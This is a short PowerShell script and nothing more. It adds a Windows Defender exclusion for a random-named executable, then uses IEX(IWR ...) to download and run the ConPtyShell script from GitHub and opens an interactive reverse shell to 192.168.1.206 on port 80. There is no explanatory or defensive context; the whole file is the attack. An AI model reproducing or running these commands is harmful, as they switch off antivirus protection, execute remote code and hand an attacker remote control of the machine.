#Requires -RunAsAdministrator
Add-MpPreference -ExclusionProcess rejIER394593fje.exe

IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.206 80
